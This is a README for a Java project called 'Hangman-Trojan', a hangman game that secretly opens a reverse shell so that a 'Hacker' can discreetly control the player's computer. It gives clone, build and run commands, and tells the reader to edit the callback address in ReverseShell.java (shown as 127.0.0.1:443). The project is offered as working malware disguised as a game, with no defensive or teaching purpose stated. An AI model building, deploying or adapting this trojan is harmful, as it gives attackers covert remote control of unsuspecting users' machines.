# Hangman Game - Trojan 

## Introduction

Welcome to the Hangman Game! This Java Maven project combines the classic hangman game with a hidden TCP connection. While users enjoy playing hangman, a Hacker can discreetly control the user computer.

## Features

- **Classic Hangman Game**: Play the traditional hangman game with a variety of words to guess.
- **TCP Connection**: Connect back to the Hacker.


## Getting Started

### Prerequisites

- Java Development Kit 11 (JDK 11) installed
- Maven installed

### Clone the Repository

```bash
git clone https://github.com/The-Hustler-Hattab/Hangman-Trojan.git
cd hangman-admin  
```
### Build the Project

```bash
mvn clean install  
```


### Run the Game by Clicking on the Jar File or Run the Below

```bash
java -jar target/hangman*.jar
```
### Usage 

``` java
// change the below variable in the file ReverseShell.java
    private static InetSocketAddress addr   = new InetSocketAddress("127.0.0.1", 443);

```
